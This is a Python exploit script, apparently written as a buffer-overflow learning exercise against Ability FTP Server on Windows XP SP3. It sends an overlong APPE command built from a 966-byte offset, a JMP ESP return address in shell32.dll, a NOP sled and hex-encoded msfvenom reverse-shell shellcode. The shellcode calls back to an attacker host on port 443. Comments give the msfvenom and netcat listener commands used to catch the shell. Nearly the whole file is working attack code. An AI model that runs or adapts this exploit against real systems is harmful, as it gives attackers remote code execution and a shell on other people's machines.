#!/usr/bin/python
# coding=utf-8
# inspiration: https://rootisthelimit.com/first-buffer-overflow/
# Target: XP SP3 x86
import binascii
import time
from socket import *

host = "192.168.140.132"
port = 21

try:
    print("\n [*] Creating network socket.")
    s = socket(AF_INET, SOCK_STREAM)
except:
    print("\n [!!!] There was an error creating the network socket. [!!!]")
    exit(0)

try:
    print(" [*] Connecting to Ability FTP Server @ {} on port TCP/{}".format(host, port))
    s.connect((host, port))
except:
    print(" [!!!] There was an error connecting")
    exit(0)

print(s.recv(2000))
time.sleep(2)

# ./pattern_create.rb -l 1500
# ./pattern_offset.rb -q 42326742
# [*] Exact match at offset 966
# searched modules loaded when crashed and selected shell32.dll
# 7C9D30D7   FFE4             JMP ESP
# little endian conversion \xD7\x30\x9D\x7C

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.140.131 LPORT=443 -f python -b '\x00\xff'
# Removed Hex syntax to allow byte to be sent to socket using binascii.unhexlify(shellcode)
# Run nc -lvp 443 on attacker machine to accept reverse shell
shellcode = "b8285deddddaccd97424f45b33"
shellcode += "c9b15231431203431283c3a10f"
shellcode += "28efb252d30f43335dea727339"
shellcode += "7f2443492dc9281fc55a5c88ea"
shellcode += "ebebeec5ec40d2446f9b07a64e"
shellcode += "545aa7978997f540c50ae9e593"
shellcode += "9682b6329f770e348e26046f10"
shellcode += "c9c91b19d10e21d36ae4dde2ba"
shellcode += "341d4883f8ec90c43f0fe73c3c"
shellcode += "b2f0fb3e68741f98fb2efb182f"
shellcode += "a8881784bed63b1b126d479095"
shellcode += "a1c1e2b16589b1d83c7717e45e"
shellcode += "d8c84015f51df97492d2308662"
shellcode += "7d42f55022f891d8ab26661e86"
shellcode += "9ff8e129e0d1257db0498ffe5b"
shellcode += "89302bcbd99e84ac895e7545c3"
shellcode += "50aa75ecbac31c172d2c489b2e"
shellcode += "c48ba331ae05455bc043def479"
shellcode += "ce946585c4d1a60deb2668e686"
shellcode += "341d06dd668819cb0e568b90ce"
shellcode += "11b00e997606474f6b31f16d76"
shellcode += "a73a35ad14c4b42020e2a6fca9"
shellcode += "ae9250fc784c1756cb26c10585"
shellcode += "ae946516a898a3e054281ab56b"
shellcode += "85ca3114fb6abdcfbf9bf44de9"
shellcode += "335104ab5962f3e867e1f19093"
shellcode += "f97094d8bd69e471288d5b7179"

buffer = "41" * 966  # padding
buffer += "D7309D7C"  # Address of JMP in loaded module allowing execution jump to stack
buffer += "90" * 50  # NOPs
buffer += shellcode
buffer += "43" * 138  # padding

print(" [+] length: %d" % (len(buffer)))

s.send('USER ftp\r\n'.encode())
print(s.recv(2000))
s.send('PASS ftp\r\n'.encode())
print(s.recv(2000))
s.send('APPE '.encode() + binascii.unhexlify(buffer) + b'\r\n')
time.sleep(4)
print(s.recv(2000))
print("[+] Evil sent!")

s.close()
